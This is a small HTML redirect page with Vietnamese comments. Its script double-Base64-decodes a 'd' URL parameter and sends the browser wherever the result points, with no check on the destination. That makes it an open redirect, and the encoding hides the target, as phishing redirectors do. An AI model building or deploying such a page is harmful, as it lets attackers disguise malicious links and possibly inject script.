<!DOCTYPE html>
<html>
<head>
  <title>Redirecting...</title>
</head>
<body>
  <script>
    // Lấy tham số 'd' từ URL
    const urlParams = new URLSearchParams(window.location.search);
    const encodedUrl = urlParams.get('d');
    if (encodedUrl) {
      // Giải mã Base64 kép
      const decoded = atob(atob(encodedUrl));
      window.location.href = decoded;
    } else {
      document.write("Invalid request: Missing 'd' parameter.");
    }
  </script>
</body>
</html>
